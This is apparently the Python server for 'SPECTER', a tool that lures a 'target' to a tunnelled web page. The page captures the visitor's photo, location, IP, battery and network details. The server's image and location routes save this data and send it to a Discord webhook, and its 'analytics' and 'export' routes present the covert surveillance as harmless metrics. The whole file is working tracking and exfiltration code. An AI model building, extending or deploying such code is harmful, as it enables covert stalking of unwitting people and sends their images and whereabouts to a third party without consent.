import argparse
import json
import logging
import os
import signal
import socket
import sys
import threading
import time

import requests
from flaredantic import FlareConfig, FlareTunnel
from flask import Flask, Response, request, send_from_directory

from utils import check_and_get_webhook_url, get_file_data, update_webhook

# Global flag to handle graceful shutdown
shutdown_flag = threading.Event()

HTML_FILE_NAME = "index.html"

if sys.stdout.isatty():
    R = '\033[31m'  # Red
    G = '\033[32m'  # Green
    C = '\033[36m'  # Cyan
    W = '\033[0m'   # Reset
    Y = '\033[33m'  # Yellow
    M = '\033[35m'  # Magenta
    B = '\033[34m'  # Blue
else:
    R = G = C = W = Y = M = B = ''

app = Flask(__name__)

parser = argparse.ArgumentParser(
    description="SPECTER - Track device location, and IP address, and capture a photo with device details.",
    usage=f"{sys.argv[0]} [-t target] [-p port]"
)
parser.add_argument("-t", "--target", nargs="?", help="the target url to send the captured images to", default="http://localhost:8000/image")
parser.add_argument("-p", "--port", nargs="?", help="port to listen on", type=int, default=8000)
args = parser.parse_args()

# Website URL file for iframe
WEBSITE_URL_FILE = "website_url.txt"


def should_exclude_line(line):
    # Add patterns of lines you want to exclude
    exclude_patterns = [
        "HTTP request"
    ]
    return any(pattern in line for pattern in exclude_patterns)


@app.route("/", methods=["GET"])
def get_website():
    html_data = ""
    try:
        html_data = get_file_data(HTML_FILE_NAME)
    except FileNotFoundError:
        pass
    return Response(html_data, content_type="text/html")


@app.route("/dwebhook.js", methods=["GET"])
def get_webhook_js():
    return send_from_directory(directory=os.getcwd(), path=DISCORD_WEBHOOK_FILE_NAME)


@app.route('/location_update', methods=["POST"])
def update_location():
    data = request.json
    discord_webhook = check_and_get_webhook_url(os.getcwd())
    
    # Log metrics to local file for analysis
    if data:
        metrics_file = 'metrics.log'
        with open(metrics_file, 'a') as f:
            f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {json.dumps(data)}\n")
    
    update_webhook(discord_webhook, data)
    return "OK"


@app.route('/image', methods=['POST'])
def image():
    i = request.files['image']
    f = ('%s.jpeg' % time.strftime("%Y%m%d-%H%M%S"))
    i.save('%s/%s' % (os.getcwd(), f))
    #print(f"{B}[+] {C}Picture of the target captured and saved")

    webhook_url = check_and_get_webhook_url(os.getcwd())
    files = {'image': open(f'{os.getcwd()}/{f}', 'rb')}
    response = requests.post(webhook_url, files=files)

    return Response("%s saved and sent to Discord webhook" % f)


@app.route('/get_target', methods=['GET'])
def get_url():
    return args.target


@app.route('/get_website', methods=['GET'])
def get_website_url():
    """Get the website URL to display in iframe"""
    try:
        with open(WEBSITE_URL_FILE, 'r') as f:
            website_url = f.read().strip()
            if website_url:
                return website_url
    except FileNotFoundError:
        pass
    return "https://www.wikipedia.org"


@app.route('/analytics', methods=['GET'])
def get_analytics():
    """Get analytics summary from metrics.log"""
    try:
        metrics_file = 'metrics.log'
        if not os.path.exists(metrics_file):
            return {"status": "no_data", "message": "No metrics collected yet"}
        
        with open(metrics_file, 'r') as f:
            lines = f.readlines()
        
        # Parse metrics
        battery_data = []
        network_data = []
        session_data = []
        
        for line in lines:
            try:
                parts = line.split(' - ', 1)
                if len(parts) == 2:
                    timestamp, json_data = parts
                    data = json.loads(json_data.strip())
                    
                    # Check for embeds to identify metric type
                    if 'embeds' in data and data['embeds']:
                        title = data['embeds'][0].get('title', '')
                        if 'Battery' in title:
                            battery_data.append(data)
                        elif 'Connection' in title:
                            network_data.append(data)
                        elif 'Session' in title:
                            session_data.append(data)
            except (json.JSONDecodeError, ValueError, IndexError):
                continue
        
        return {
            "status": "success",
            "total_entries": len(lines),
            "battery_readings": len(battery_data),
            "network_readings": len(network_data),
            "sessions": len(session_data),
            "latest_metrics": {
                "battery": battery_data[-1] if battery_data else None,
                "network": network_data[-1] if network_data else None,
                "session": session_data[-1] if session_data else None
            }
        }
    except Exception as e:
        return {"status": "error", "message": str(e)}


@app.route('/metrics/export', methods=['GET'])
def export_metrics():
    """Export metrics as JSON"""
    try:
        metrics_file = 'metrics.log'
        if not os.path.exists(metrics_file):
            return {"status": "no_data"}
        
        with open(metrics_file, 'r') as f:
            lines = f.readlines()
        
        metrics = []
        for line in lines:
            try:
                parts = line.split(' - ', 1)
                if len(parts) == 2:
                    timestamp, json_data = parts
                    metrics.append({
                        "timestamp": timestamp.strip(),
                        "data": json.loads(json_data.strip())
                    })
            except (json.JSONDecodeError, ValueError):
                continue
        
        return {"status": "success", "metrics": metrics}
    except Exception as e:
        return {"status": "error", "message": str(e)}


# run_flask function to handle threading
def run_flask(folder_name):
    try:
        os.chdir(folder_name)
    except FileNotFoundError:
        print(f"{R}Error: Folder '{folder_name}' does not exist.{W}")
        sys.exit(1)

    # Start Flask in a separate thread
    flask_thread = threading.Thread(target=app.run, kwargs={"host": "0.0.0.0", "port": args.port, "debug": False})
    flask_thread.daemon = True
    flask_thread.start()

    # Keep the main thread running to monitor the shutdown flag
    try:
        while not shutdown_flag.is_set():
            time.sleep(0.5)
    except KeyboardInterrupt:
        print(f"{R}Flask server terminated.{W}")
        shutdown_flag.set()


def signal_handler(sig, frame):
    """Handles termination signals like CTRL+C."""
    print(f"{R}Exiting...{W}")
    shutdown_flag.set()  # Set the shutdown flag to terminate threads
    sys.exit(0)


# Attach signal handler for CTRL+C
signal.signal(signal.SIGINT, signal_handler)


# Cloudflare tunnel with non-blocking handling
def run_tunnel():
    try:
        config = FlareConfig(
            port=args.port,
            verbose=True  # Enable logging for debugging
        )
        with FlareTunnel(config) as tunnel:
            print(f"{G}[+] Flask app available at: {C}{tunnel.tunnel_url}{W}")

            # Keep the main thread running to monitor the shutdown flag
            while not shutdown_flag.is_set():
                time.sleep(0.5)
    except Exception as e:
        logging.error(f"Error in Cloudflare tunnel: {e}")
        print(f"{R}Error: {e}{W}")


def get_local_ip():
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            sock.connect(("8.8.8.8", 80))
            return sock.getsockname()[0]
    except OSError:
        try:
            hostname = socket.gethostname()
            addresses = socket.gethostbyname_ex(hostname)[2]
            for address in addresses:
                if not address.startswith("127."):
                    return address
        except OSError:
            pass
    return None


def print_local_access_links(port):
    local_host_url = f"http://127.0.0.1:{port}/"
    print(f"{B}[+] {C}Local host link: {W}{local_host_url}")

    local_ip = get_local_ip()
    if local_ip:
        local_ip_url = f"http://{local_ip}:{port}/"
        print(f"{B}[+] {C}Local IP link: {W}{local_ip_url}")
    else:
        print(f"{Y}[!] {W}Could not detect a local IP address for LAN access.")


# Port check
def is_port_available(port):
    """
    Check if a port is available.
    """
    print(f"{B}[?] {C}Checking if port {Y}{port}{W} is available...{W}", end="", flush=True)
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        if sock.connect_ex(("127.0.0.1", port)) != 0:
            print(f" {G}[AVAILABLE]{W}")
            return True
        else:
            print(f" {R}[IN USE]{W}")
            return False
